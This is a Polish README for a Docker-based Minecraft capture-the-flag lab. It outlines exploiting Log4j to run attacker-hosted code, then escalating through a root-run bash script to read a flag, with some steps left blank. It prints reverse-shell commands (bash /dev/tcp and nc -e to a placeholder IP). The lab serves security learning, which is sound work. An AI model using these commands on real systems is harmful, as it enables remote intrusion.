# minecraft-ctf

- próbujesz uruchomić sklauncher (jak nie masz javy, to se pobierz i zainstaluj)
- dockera też potrzebujesz (duh)
- odpalasz docer compose
- to ci uruchamia 3 kontenery
- dwa są tak jakby 'twoje', marshaller i httpcode. 'twoje' oznacza, że w topologii realnej są procesami, które ty kontrolujesz i stawiasz na swoim kompie, tutaj są w dockerach, żeby usprawnić całość,
- twoje zadanie jest następujące: zdobyć flagę :DD
- w tym celu:
  1. używasz podatności Log4j, by wykonać kod hostowany na httpcode,
  2. kod hostowany na httpcode musisz przygotować i skompilować (kompilacja się dzieje podczas budowania kontenera),
  3. kod musi ci umożliwić kontrole na serverze
  4. musisz znaleźć skrypt bashowy wykonywany z uprawnieniami roota, który możesz zmodyfikować,
  5. zmodyfikować go tak, by ...
  6. ...
  7. teraz masz dostęp do pliku z flagą,
  8. wyślij screen flagi na upela ;D
  9. udanej zabawy!



Przydatne rzeczy:

Reverse shell:
```sh
# https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

# odpalasz nasluchiwanie tcp na porcie `5000` na swoim kompie
nc -l 5000

# na kompie ofiary na którym możesz uruchomić komendę robisz
# (musisz wejść w basha - czyli wpisz `bash` w terminal)
bash -i >& /dev/tcp/[ip mojego kompa]/5000 0>&1
# albo to (ale mi nie działało)
nc [ip mojego kompa] 5000 –e /bin/bash


# Możesz to przetestować robiąc w jednym terminalu
nc -l 5000
# a w drugim
bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
```


